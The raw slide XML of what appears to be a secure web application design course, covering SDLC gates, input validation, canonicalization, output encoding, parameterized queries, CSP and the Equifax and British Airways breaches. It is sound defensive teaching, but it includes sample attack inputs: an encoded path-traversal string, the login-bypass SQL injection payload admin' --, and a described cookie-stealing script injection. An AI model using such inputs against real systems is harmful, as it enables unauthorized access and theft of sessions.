              <a:t> A parameterized query stops SQLi even if validation is imperfect; encoding stops XSS even if data was stored maliciously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Mirrors network defense-in-depth:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Same philosophy as firewalls + segmentation + IDS/IPS, but entirely within one codebase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it's necessary:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> A firewall cannot distinguish a legitimate SQL query from a malicious one, both travel over port 443 inside HTTPS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5.5.1.b.1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Glossary Check-In: Foundations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 Web Application Design:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Building software so security is intrinsic, formalized in OWASP ASVS and NIST SP 800-218</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Secure-by-design:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Security as a primary design constraint from the first architecture diagram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Secure-by-default:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Safest reasonable configuration ships without requiring manual hardening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Trust boundary:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> The line separating trusted code/data from untrusted input requiring validation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Defense-in-depth:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Multiple independent controls covering the same risk so one failure isn't catastrophic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Secure Development Lifecycle and Its Gates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Secure Development Lifecycle and Its Gates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Requirements:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Security requirements (auth strength, data classification, PCI-DSS/HIPAA obligations) captured alongside functional ones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Design/Threat Modeling:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Structured methodologies like STRIDE enumerate attacks before code is written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Implementation:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Secure coding standards, vetted libraries, peer code review</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Verification/Testing:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Automated SAST and DAST scanning plus manual penetration testing before production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Release and Response:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Sign-off gate confirms remediation; post-release patch management follows a defined timeline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Input Validation: Allowlisting Over Denylisting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Input validation:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Checking data conforms to strict expectations (type, length, format, range) before it is acted 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Allowlisting (positive validation):</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Define the exact permitted set; reject everything else by default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Denylisting (negative validation):</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Define known-bad patterns; permit everything else, structurally weaker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allowlisting wins:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Denylists require predicting every dangerous variant, including encoding tricks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Classic denylist failure:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Blocking the literal string 'SELECT' while an attacker submits 'SeLeCt' or a URL-encoded variant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Canonicalization: Validating Before Full Decoding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Canonicalization:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Converting data to a single standard representation before validating or acting on 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bug:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Validation runs BEFORE data is fully decoded, letting an alternate encoding smuggle a payload past the filter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Path traversal example:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Checking for '../' before URL-decoding lets an attacker submit '%2e%2e%2f'</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decode step:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> '%2e%2e%2f' passes the literal-string check, then decodes to '../' afterward, filter bypassed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Correct order of operations:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Fully decode and normalize input to canonical form FIRST, then validate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Canonicalization Bypass of a Path Filter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Simulated filter:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Rejects any path containing the literal substring '../' BEFORE decoding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a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> '%2e%2e%2f' passes the literal check because it doesn't contain '../' yet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bug exposed:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Decoding after validation reveals the smuggled traversal sequence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fix:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Decode fully first, then re-check the canonical form for '../' before use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Order of operations is itself a security control, not just an implementation detail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Output Encoding Must Be Context-Aware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Output encoding:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Transforming data immediately before writing it into a specific output context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context matters:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> The same data can be dangerous for different reasons depending on where it renders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HTML body context:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Encode &lt;, &gt;, &amp;, quotes as HTML entities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JavaScript string context:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Escape quotes, backslashes, line terminators to prevent breaking out of a string literal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URL and attribute contexts:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Percent-encode reserved characters; quote and encode attribute values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XSS in Practice: Vulnerable Reflection vs. Encoded Output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scenario:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> profile.php reflects a $_GET['username'] parameter directly into an &lt;h1&gt; without encoding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a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> A crafted username value containing a &lt;script&gt; tag fetches document.cookie to an attacker server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 of the flaw:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Attacker JavaScript executes inside the victim's own authenticated browser session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fix:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Wrap the reflected value in htmlspecialchars() with ENT_QUOTES before echoing it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SAST connection:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> This exact pattern is what a scanner flags as 'Insecure input reflection on page profile.php'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SQL Injection as a Trust-Boundary Failure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a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> User input concatenated directly into a command string interpreted as executable syntax by the database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Vulnerable pattern:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> query = "...WHERE username = '" + username + "'..."</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Bypass payload:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Submitting admin' -- comments out the trailing password check</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wrong fix:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> 'Better validation' of the input string doesn't eliminate the vulnerability class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right fix:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Parameterized queries separate the query's structure from its data at the protocol level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Parameterized Queries: Compile Structure First, Bind Data Second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mechanism:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Query template with placeholders sent to the database separately from user-supplied values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Compile before bind:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> The database compiles the fixed query structure BEFORE any value is transmitted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Structural guarantee:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Values are bound strictly as data, they can never alter the query's logical structure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Native driver support:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> PDO (PHP), java.sql.PreparedStatement (Java), parameterized cursor.execute() (Python DB-API)</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Exam-critical distinction:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> 'Use parameterized queries' is the correct answer, not 'sanitize the input'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5.5.2.c.3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SQL Injection Bypass vs. Parameterized Defense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Simulated database:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> An in-memory user list stands in for a real users table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Vulnerable path:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Login built by string concatenation; payload admin' -- bypasses the password check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Parameterized path:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> The same payload is compared as an exact literal string and fails to match</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Observed contrast:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Identical input, opposite outcomes, depending purely on query construction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The vulnerability is structural, not about the 'cleverness' of the attacker's string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Secure Defaults, Fail-Closed, and Least Privilege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Secure-by-default in practice:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Unnecessary services disabled, default admin credentials removed, verbose errors suppressed in production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Least privilege:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Grant only the minimum permissions required for a function, e.g., read-only where write isn't needed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Fail closed vs. fail open:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Deny access when a control can't decide (expired session, unreachable auth service) rather than granting it by default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fail-closed wins:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> An ambiguous condition treated as 'deny' bounds the worst case; treated as 'allow' does not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Formalized by:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> NIST SP 800-53 control AC-6 (least privilege)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5.5.2.d.2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Content Security Policy: A Browser-Enforced Allowlist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CSP:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> An HTTP response header instructing the browser which sources of script/style/image content may load and execute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 in depth:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Even if an XSS payload is reflected into the page, a strict CSP can prevent it from executing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default-src 'self':</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Fallback policy, only load content from the app's own origin unless overridden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script-src allowlist:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> An injected inline &lt;script&gt; or attacker-domain script is blocked outright by the browser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object-src 'none' / frame-ancestors 'none':</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Disables legacy plugins and prevents clickjacking via iframe embedding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5.5.2.d.3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Interactive: Building a CSP Header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 page loads its own scripts plus one trusted CDN, and must block clickjacking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a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Toggle which directives are present and observe which attacker behaviors are blocked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script-src variations:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Removing the CDN allowlist entry blocks the CDN script too, overly strict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frame-ancestors 'none':</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Removing it re-opens the clickjacking iframe-embedding risk</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Lesson:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> CSP is a precise allowlist, too loose leaves gaps, too strict breaks legitimate functionality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5.5.2.e.1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Glossary Check-In: Technical Depth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SDLC gates:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Requirements, Design/Threat Modeling, Implementation, Verification, Release, Response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SAST vs DAST:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Static analysis of source code vs. dynamic testing of a running application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Allowlisting vs denylisting:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Permit known-good vs. block known-bad, allowlisting is structurally stronger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Canonicalization:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Fully decode before validating, or a filter can be bypassed by an alternate encoding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Parameterized queries, output encoding, CSP:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Three independent, layered defenses against injection and XSS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2017 Equifax Breach, an SDLC Response-Gate Failure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2017 Equifax Breach, an SDLC Response-Gate Failure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flaw:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> CVE-2017-5638, a critical RCE in Apache Struts 2's Jakarta Multipart parser (CVSS 10.0)</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patch existed:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Released March 7, 2017, two days before public proof-of-concept exploit code appeared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failure:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Equifax's asset inventory/patch management couldn't identify which servers needed it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Compounding failures:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> An expired TLS-inspection certificate blinded intrusion detection for over a year; insufficient network segmentation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~147 million individuals' SSNs, birth dates, addresses exposed; a settlement exceeding $575 million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2018 British Airways Magecart Attack, Missing CSP and SRI</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attack:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Magecart attackers modified a JavaScript file on the payment page, only 22 lines of code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mechanism:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> The script silently captured name, address, and full payment card details as customers typed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TLS/PCI-DSS didn't help:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> The skimming happened entirely client-side, inside the victim's own trusted-origin browser context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~380,000 customer transactions affected; a £20 million GDPR fine from the UK ICO</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missing controls:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> A scoped script-src CSP directive and SRI hashing would each independently have prevented this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5.5.3.b.1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DevSecOps: Shifting Security Left as a Positive Counter-Example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Shift-left philosophy:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Embed SAST scanning directly into CI/CD pipelines rather than testing only before release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Peer review gate:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Require review of every pull request against a secure coding checklist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Software Composition Analysis (SCA):</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Automated dependency-vulnerability scanning on every build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Measured outcome:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Dramatically shorter mean time-to-remediate for newly discovered flaws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Direct connection:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> This exact pipeline would have flagged the profile.php reflection finding before it reached production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5.5.3.b.2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Glossary Check-In: Case Studies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Equifax (2017):</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> An available patch never applied, SDLC Response-gate failure, ~147M records exposed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British Airways (2018):</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Missing CSP/SRI, Magecart client-side skimming, £20M GDPR fine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Magecart:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Web-skimming threat clusters that inject malicious JS into checkout pages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DevSecOps / shift-left:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Continuous CI/CD-integrated SAST/SCA scanning that catches flaws pre-production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thread:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Both breaches trace back to a known, documented control (patching, CSP/SRI) that existed but wasn't applied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Hardening Layer 1: Server-Side Input Enforcement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Layer 1: Server-Side Input Enforcement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a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> All validation logic must execute on the server, regardless of client-side checks for UX</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a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Browser-based JavaScript validation is trivially bypassed by direct API calls (curl, Burp Suite)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 posture:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Validation should default to allowlisting known-good formats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Ordering rule:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> All decoding/canonicalization must occur before validation logic runs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Never sufficient alone:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Validation must be paired with output encoding and parameterized queries as independent layers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Layer 2: Output Encoding by Default in Frameworks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default:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> React, Angular, and Django templates apply HTML-context encoding automatically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Secure-by-default in action:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
